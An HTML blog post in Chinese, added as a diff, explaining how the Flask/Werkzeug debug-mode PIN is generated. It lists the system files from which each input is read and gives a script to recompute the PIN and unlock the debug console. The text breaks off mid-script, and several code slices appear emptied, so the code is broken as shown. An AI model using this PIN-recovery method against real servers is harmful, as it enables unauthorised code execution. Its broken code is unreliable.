@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  <meta name="author" content="鱿鱼">
+
+
+  <meta name="subtitle" content="鱿鱼的blog">
+
+
+
+
+<title>flask debug 模式下的pin码 | 鱿鱼</title>
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/nprogress/nprogress.css">
+
+
+
+<script src="/lib/jquery.min.js"></script>
+
+
+<script src="/lib/iconify-icon.min.js"></script>
+
+
+<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+<script>
+  tailwind.config = {
+    darkMode: "class",
+  };
+</script>
+
+
+<script src="/lib/nprogress/nprogress.js"></script>
+
+<script>
+  $(document).ready(() => {
+    NProgress.configure({
+      showSpinner: false,
+    });
+    NProgress.start();
+    $("#nprogress .bar").css({
+      background: "#de7441",
+    });
+    $("#nprogress .peg").css({
+      "box-shadow": "0 0 2px #de7441, 0 0 4px #de7441",
+    });
+    $("#nprogress .spinner-icon").css({
+      "border-top-color": "#de7441",
+      "border-left-color": "#de7441",
+    });
+    setTimeout(function () {
+      NProgress.done();
+      $(".fade").removeClass("out");
+    }, 800);
+  });
+</script>
+
+<script>
+  (function () {
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+    if (setting === "dark" || (prefersDark && setting !== "light"))
+      document.documentElement.classList.toggle("dark", true);
+    let isDark = document.documentElement.classList.contains("dark");
+  })();
+
+  $(document).ready(function () {
+    // init icon
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const isDark = document.documentElement.classList.contains("dark");
+    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+
+    function toggleGiscusTheme() {
+      const isDark = document.documentElement.classList.contains("dark");
+      const giscusFrame = document.querySelector("iframe.giscus-frame");
+      if (giscusFrame) {
+        giscusFrame.contentWindow.postMessage(
+          {
+            giscus: {
+              setConfig: {
+                theme: isDark ? "dark" : "light",
+              },
+            },
+          },
+          "https://giscus.app"
+        );
+      }
+    }
+
+    // toggle dark mode
+    function toggleDark() {
+      let isDark = document.documentElement.classList.contains("dark");
+      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+      isDark = !isDark;
+      document.documentElement.classList.toggle("dark", isDark);
+      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+      if (prefersDark === isDark) {
+        localStorage.setItem("hexo-color-scheme", "auto");
+      } else {
+        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
+      }
+      toggleGiscusTheme();
+    }
+
+    // listen dark mode change
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (e) => {
+        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+        if (setting === "auto") {
+          document.documentElement.classList.toggle("dark", e.matches);
+          $("#theme-icon").attr(
+            "icon",
+            e.matches ? "ri:moon-line" : "ri:sun-line"
+          );
+          toggleGiscusTheme();
+        }
+      });
+
+    $("#toggle-dark").click((event) => {
+      const isAppearanceTransition = document.startViewTransition && !window.matchMedia('(prefers-reduced-motion: reduce)').matches
+      if (!isAppearanceTransition) {
+        toggleDark()
+        return
+      }
+      const x = event.clientX
+      const y = event.clientY
+      const endRadius = Math.hypot(
+        Math.max(x, innerWidth - x),
+        Math.max(y, innerHeight - y),
+      )
+      const transition = document.startViewTransition(async () => {
+        toggleDark()
+      })
+
+      transition.ready
+        .then(() => {
+          const isDark = document.documentElement.classList.contains("dark")
+          const clipPath = [
+            `circle(0px at ${x}px ${y}px)`,
+            `circle(${endRadius}px at ${x}px ${y}px)`,
+          ]
+          document.documentElement.animate(
+            {
+              clipPath: isDark
+                ? [...clipPath].reverse()
+                : clipPath,
+            },
+            {
+              duration: 400,
+              easing: 'ease-out',
+              pseudoElement: isDark
+                ? '::view-transition-old(root)'
+                : '::view-transition-new(root)',
+            },
+          )
+        })
+    });
+  });
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200 relative">
+  <header class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5">
+  <div class="max-auto">
+    <nav class="flex items-center text-base">
+      <a href="/" class="group">
+        <h2 class="font-medium tracking-tighterp text-l p-2">
+          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/logo.svg" alt="鱿鱼" />
+          鱿鱼
+        </h2>
+      </a>
+      <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
+        flask debug 模式下的pin码
+      </div>
+      <div class="flex-1"></div>
+      <div class="flex items-center gap-3">
+        
+          <a class="hidden sm:flex" href="/archives">Posts</a>
+        
+          <a class="hidden sm:flex" href="/about">about</a>
+        
+        
+          
+            <a class="w-5 h-5 hidden sm:flex" title="Github" target="_blank" rel="noopener" href="https://github.com/squid1LLL">
+              <iconify-icon width="20" icon="ri:github-line"></iconify-icon>
+            </a>
+          
+        
+        <a class="w-5 h-5 hidden sm:flex" title="Github" href="rss2.xml">
+          <iconify-icon width="20" icon="ri:rss-line"></iconify-icon>
+        </a>
+        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
+          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
+        </a>
+      </div>
+      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
+        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
+          <iconify-icon width="20" icon="carbon:menu" ></iconify-icon>
+        </span>
+        <span class="w-5 h-5 hidden" aria-hidden="true" role="img" id="close-menu">
+          <iconify-icon  width="20" icon="carbon:close" ></iconify-icon>
+        </span>
+      </div>
+    </nav>
+  </div>
+</header>
+<div id="menu-panel" class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10">
+  <div id="menu-content" class="relative z-20 bg-white/80 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300">
+    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
+      
+        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
+          <a href="/archives" class="flex h-12 sm:h-auto items-center">Posts</a>
+        </li>
+      
+        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
+          <a href="/about" class="flex h-12 sm:h-auto items-center">about</a>
+        </li>
+      
+    </ul>
+  </div>
+  <div class="mask bg-black/20 absolute inset-0"></div>
+</div>
+
+  <main class="pt-14">
+    <!-- css -->
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">
+
+
+<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">
+
+<!-- toc -->
+
+  <!-- tocbot -->
+<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>
+
+
+<section class="px-6 max-w-prose mx-auto md:px-0">
+  <!-- header -->
+  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
+    <div class="pt-4 md:pt-6">
+      <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
+        flask debug 模式下的pin码
+      </h1>
+      <div>
+        <section class="flex items-center gap-3 text-sm">
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
+            <time>2024-12-19</time>
+          </span>
+          <span class="text-gray-400">·</span>
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="ic:round-access-alarm" ></iconify-icon>
+            <span>10 min</span>
+          </span>
+          <span class="text-gray-400">·</span>
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
+            <span>2.2k words</span>
+          </span>
+          
+            <span class="text-gray-400">·</span>
+            <span class="flex items-center gap-1">
+              <iconify-icon width="16" icon="icon-park-outline:box" class="mr-2"></iconify-icon>
+              <a class="article-category-link" href="/categories/note/">note</a>
+            </span>
+          
+        </section>
+      </div>
+    </div>
+  </header>
+  <!-- content -->
+  <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
+    <h3 id="pin码是什么"><a href="#pin码是什么" class="headerlink" title="pin码是什么"></a>pin码是什么</h3><h4 id="PIN是-Werkzeug（它是-Flask-的依赖项之一）提供的额外安全措施，以防止在不知道-PIN-的情况下访问调试器。"><a href="#PIN是-Werkzeug（它是-Flask-的依赖项之一）提供的额外安全措施，以防止在不知道-PIN-的情况下访问调试器。" class="headerlink" title="PIN是 Werkzeug（它是 Flask 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。"></a>PIN是 Werkzeug（它是 Flask 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。</h4><h4 id="flask在debug模式下会生成一个叫pin码的东西，就是一个安全层的作用，用于debug模式下的身份验证"><a href="#flask在debug模式下会生成一个叫pin码的东西，就是一个安全层的作用，用于debug模式下的身份验证" class="headerlink" title="flask在debug模式下会生成一个叫pin码的东西，就是一个安全层的作用，用于debug模式下的身份验证"></a>flask在debug模式下会生成一个叫pin码的东西，就是一个安全层的作用，用于debug模式下的身份验证</h4><h3 id="为什么是-console路径"><a href="#为什么是-console路径" class="headerlink" title="为什么是&#x2F;console路径"></a>为什么是&#x2F;console路径</h3><h4 id="这是一个实例代码"><a href="#这是一个实例代码" class="headerlink" title="这是一个实例代码"></a>这是一个实例代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def hello():</span><br><span class="line">    return &#x27;HelloWorld&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8080, debug=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="然后就是一个一直找的过程，首先从app-run的app进入到flask-app-py里面，然后我们知道PIN是-Werkzeug（它是-Flask-的依赖项之一）提供的额外安全措施，找到Werkzeug，并且就是导入了run-simple-我们继续看进去"><a href="#然后就是一个一直找的过程，首先从app-run的app进入到flask-app-py里面，然后我们知道PIN是-Werkzeug（它是-Flask-的依赖项之一）提供的额外安全措施，找到Werkzeug，并且就是导入了run-simple-我们继续看进去" class="headerlink" title="然后就是一个一直找的过程，首先从app.run的app进入到flask&#x2F;app.py里面，然后我们知道PIN是 Werkzeug（它是 Flask 的依赖项之一）提供的额外安全措施，找到Werkzeug，并且就是导入了run_simple,我们继续看进去"></a>然后就是一个一直找的过程，首先从app.run的app进入到flask&#x2F;app.py里面，然后我们知道PIN是 Werkzeug（它是 Flask 的依赖项之一）提供的额外安全措施，找到Werkzeug，并且就是导入了run_simple,我们继续看进去</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="/111.png"></h4><h4 id="进入到serving-py里面，有一个对use-debugger的定义，向下找到use-debugger"><a href="#进入到serving-py里面，有一个对use-debugger的定义，向下找到use-debugger" class="headerlink" title="进入到serving.py里面，有一个对use_debugger的定义，向下找到use_debugger"></a>进入到serving.py里面，有一个对use_debugger的定义，向下找到use_debugger</h4><h4 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/222.png"></h4><h4 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="/333.png"></h4><h4 id="在进入DebuggedApplication模块，就能看到，这里定义了console-path"><a href="#在进入DebuggedApplication模块，就能看到，这里定义了console-path" class="headerlink" title="在进入DebuggedApplication模块，就能看到，这里定义了console_path"></a>在进入DebuggedApplication模块，就能看到，这里定义了console_path</h4><h4 id="-3"><a href="#-3" class="headerlink" title=""></a><img src="/444.png"></h4><h3 id="pin码的生成"><a href="#pin码的生成" class="headerlink" title="pin码的生成"></a>pin码的生成</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><h5 id="【我找的那篇参考文章（文章等下会贴在下面）其实重点是分析pin码的生成，正好，又学到了】"><a href="#【我找的那篇参考文章（文章等下会贴在下面）其实重点是分析pin码的生成，正好，又学到了】" class="headerlink" title="【我找的那篇参考文章（文章等下会贴在下面）其实重点是分析pin码的生成，正好，又学到了】"></a>【我找的那篇参考文章（文章等下会贴在下面）其实重点是分析pin码的生成，正好，又学到了】</h5><h5 id="在DebuggedApplication模块有个模块是get-pin-and-cookie-name"><a href="#在DebuggedApplication模块有个模块是get-pin-and-cookie-name" class="headerlink" title="在DebuggedApplication模块有个模块是get_pin_and_cookie_name"></a>在DebuggedApplication模块有个模块是get_pin_and_cookie_name</h5><h5 id="这里把它贴出来"><a href="#这里把它贴出来" class="headerlink" title="这里把它贴出来"></a>这里把它贴出来</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">def get_pin_and_cookie_name(</span><br><span class="line">    app: WSGIApplication,</span><br><span class="line">) -&gt; tuple[] | tuple[]:</span><br><span class="line">    &quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span><br><span class="line">    code and a random key.  The hope is that this is stable between</span><br><span class="line">    restarts to not make debugging particularly frustrating.  If the pin</span><br><span class="line">    was forcefully disabled this returns `None`.</span><br><span class="line"></span><br><span class="line">    Second item in the resulting tuple is the cookie name for remembering.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    pin = os.environ.get(&quot;WERKZEUG_DEBUG_PIN&quot;)</span><br><span class="line">    rv = None</span><br><span class="line">    num = None</span><br><span class="line"></span><br><span class="line">    # Pin was explicitly disabled</span><br><span class="line">    if pin == &quot;off&quot;:</span><br><span class="line">        return None, None</span><br><span class="line"></span><br><span class="line">    # Pin was provided explicitly</span><br><span class="line">    if pin is not None and pin.replace(&quot;-&quot;, &quot;&quot;).isdecimal():</span><br><span class="line">        # If there are separators in the pin, return it directly</span><br><span class="line">        if &quot;-&quot; in pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        else:</span><br><span class="line">            num = pin</span><br><span class="line"></span><br><span class="line">    modname = getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)</span><br><span class="line">    username: str | None</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        # getuser imports the pwd module, which does not exist in Google</span><br><span class="line">        # App Engine. It may also raise a KeyError if the UID does not</span><br><span class="line">        # have a username, such as in Docker.</span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    except (ImportError, KeyError):</span><br><span class="line">        username = None</span><br><span class="line"></span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    # This information only exists to make the cookie unique on the</span><br><span class="line">    # computer, not as a security feature.</span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        getattr(app, &quot;__name__&quot;, type(app).__name__),</span><br><span class="line">        getattr(mod, &quot;__file__&quot;, None),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    # This information is here to make it harder for an attacker to</span><br><span class="line">    # guess the cookie name.  They are unlikely to be contained anywhere</span><br><span class="line">    # within the unauthenticated debug page.</span><br><span class="line">    private_bits = []</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">        if not bit:</span><br><span class="line">            continue</span><br><span class="line">        if isinstance(bit, str):</span><br><span class="line">            bit = bit.encode()</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(b&quot;cookiesalt&quot;)</span><br><span class="line"></span><br><span class="line">    cookie_name = f&quot;__wzd&#123;h.hexdigest()[]&#125;&quot;</span><br><span class="line"></span><br><span class="line">    # If we need to generate a pin we salt it a bit more so that we don&#x27;t</span><br><span class="line">    # end up with the same value and generate out 9 digits</span><br><span class="line">    if num is None:</span><br><span class="line">        h.update(b&quot;pinsalt&quot;)</span><br><span class="line">        num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[]</span><br><span class="line"></span><br><span class="line">    # Format the pincode in groups of digits for easier remembering if</span><br><span class="line">    # we don&#x27;t have a result yet.</span><br><span class="line">    if rv is None:</span><br><span class="line">        for group_size in 5, 4, 3:</span><br><span class="line">            if len(num) % group_size == 0:</span><br><span class="line">                rv = &quot;-&quot;.join(</span><br><span class="line">                    num[].rjust(group_size, &quot;0&quot;)</span><br><span class="line">                    for x in range(0, len(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    return rv, cookie_name</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.获取环境变量：</span><br><span class="line">函数首先从环境变量 WERKZEUG_DEBUG_PIN 中获取 PIN 码。</span><br><span class="line">如果 PIN 码被显式设置为 &quot;off&quot;，则函数立即返回 (None, None)，表示 PIN 码被禁用。</span><br><span class="line">2.解析 PIN 码：</span><br><span class="line">如果环境变量中提供了 PIN 码，并且该 PIN 码（去除任何 - 分隔符后）仅包含数字，则函数会尝试使用该 PIN 码。</span><br><span class="line">如果 PIN 码包含 - 分隔符，则直接使用该 PIN 码作为 rv（返回的 PIN 码字符串）。</span><br><span class="line">如果 PIN 码不包含 - 分隔符，则将其存储在 num 变量中，以便后续处理。</span><br><span class="line">3.获取应用和用户信息：</span><br><span class="line">函数从 app 对象中获取模块名、应用名等信息。</span><br><span class="line">尝试获取当前用户名，但如果环境不支持（如 Google App Engine）或无法获取用户名（如 Docker 容器），则用户名将设置为 None。</span><br><span class="line">4.准备 cookie 名称的生成信息：</span><br><span class="line">公开信息（probably_public_bits）包括用户名、模块名、应用名和模块文件路径。</span><br><span class="line">私有信息（private_bits）包括机器的 MAC 地址和机器 ID（后者可能是一个自定义函数）。</span><br><span class="line">5.生成 cookie 名称：</span><br><span class="line">使用 SHA-1 哈希算法，将公开和私有信息编码为字节串并更新哈希对象。</span><br><span class="line">添加一个固定的盐值 &quot;cookiesalt&quot;。</span><br><span class="line">根据哈希对象的十六进制摘要的前 20 个字符，生成 cookie 名称，前缀为 &quot;__wzd&quot;。</span><br><span class="line">6.生成 PIN 码（如果需要）：</span><br><span class="line">如果之前没有从环境变量中获取到有效的 PIN 码（即 num 为 None），则通过更新哈希对象并添加一个额外的盐值 &quot;pinsalt&quot; 来生成一个新的 PIN 码。</span><br><span class="line">将生成的哈希值转换为整数，并格式化为一个 9 位的数字字符串。</span><br><span class="line">7.格式化 PIN 码：</span><br><span class="line">如果之前没有从环境变量中获取到带有分隔符的 PIN 码（即 rv 为 None），则尝试将生成的 9 位数字字符串按照不同的分组大小（5、4、3）进行格式化，并在每组数字之间添加 - 分隔符，以便于记忆。</span><br><span class="line">如果无法找到合适的分组大小，则直接使用未格式化的数字字符串作为 PIN 码。</span><br><span class="line">8.返回结果：</span><br><span class="line">函数最终返回一个元组 (rv, cookie_name)，其中 rv 是格式化后的 PIN 码字符串（或 None，如果 PIN 码被禁用或无法生成），cookie_name 是生成的 cookie 名称。</span><br></pre></td></tr></table></figure>
+
+<h5 id="上面是这个函数的流程分析，其实环境变量是重要的，PIN是从环境变量读取的，"><a href="#上面是这个函数的流程分析，其实环境变量是重要的，PIN是从环境变量读取的，" class="headerlink" title="上面是这个函数的流程分析，其实环境变量是重要的，PIN是从环境变量读取的，"></a>上面是这个函数的流程分析，其实环境变量是重要的，PIN是从环境变量读取的，</h5><h5 id="如果没设置环境变量，PIN的生成依赖于username-appname-modname-moddir-uuidnode-machine-id"><a href="#如果没设置环境变量，PIN的生成依赖于username-appname-modname-moddir-uuidnode-machine-id" class="headerlink" title="如果没设置环境变量，PIN的生成依赖于username appname modname moddir uuidnode machine_id"></a>如果没设置环境变量，PIN的生成依赖于username appname modname moddir uuidnode machine_id</h5><h4 id="读取方式："><a href="#读取方式：" class="headerlink" title="读取方式："></a>读取方式：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">username</span><br><span class="line">通过getpass.getuser()读取，通过文件读取/etc/passwd</span><br><span class="line"></span><br><span class="line">modname</span><br><span class="line">通过getattr(mod,“file”,None)读取，默认值为flask.app</span><br><span class="line"></span><br><span class="line">appname</span><br><span class="line">通过getattr(app,“name”,type(app).name)读取，默认值为Flask</span><br><span class="line"></span><br><span class="line">moddir</span><br><span class="line">当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取</span><br><span class="line"></span><br><span class="line">uuidnode</span><br><span class="line">通过uuid.getnode()读取，通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算</span><br><span class="line"></span><br><span class="line">machine_id</span><br><span class="line">每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br></pre></td></tr></table></figure>
+
+<h4 id="生成算法"><a href="#生成算法" class="headerlink" title="生成算法"></a>生成算法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">​</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;,  # username</span><br><span class="line">    &#x27;flask.app&#x27;,  # modname</span><br><span class="line">    &#x27;Flask&#x27;,  # getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">    &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;  # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line"># This information is here to make it harder for an attacker to</span><br><span class="line"># guess the cookie name.  They are unlikely to be contained anywhere</span><br><span class="line"># within the unauthenticated debug page.</span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485377957890&#x27;,  # str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">    # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup</span><br><span class="line">    &#x27;861c92e8075982bcac4a021de9795f6e3291673c8c872ca3936bcaa8a071948b&#x27;</span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&quot;utf-8&quot;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&quot;cookiesalt&quot;)</span><br><span class="line">​</span><br><span class="line">cookie_name = f&quot;__wzd&#123;h.hexdigest()[]&#125;&quot;</span><br><span class="line">​</span><br><span class="line"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span><br><span class="line"># end up with the same value and generate out 9 digits</span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&quot;pinsalt&quot;)</span><br><span class="line">    num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[]</span><br><span class="line">​</span><br><span class="line"># Format the pincode in groups of digits for easier remembering if</span><br><span class="line"># we don&#x27;t have a result yet.</span><br><span class="line">rv = None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &quot;-&quot;.join(</span><br><span class="line">                num[].rjust(group_size, &quot;0&quot;)</span><br><span class="line">                for x in range(0, len(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line">​</span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+
+<h4 id="python不同版本的算法也不同"><a href="#python不同版本的算法也不同" class="headerlink" title="python不同版本的算法也不同"></a>python不同版本的算法也不同</h4><h4 id="3-6-md5"><a href="#3-6-md5" class="headerlink" title="3.6 md5"></a>3.6 md5</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#MD5</span><br><span class="line">import 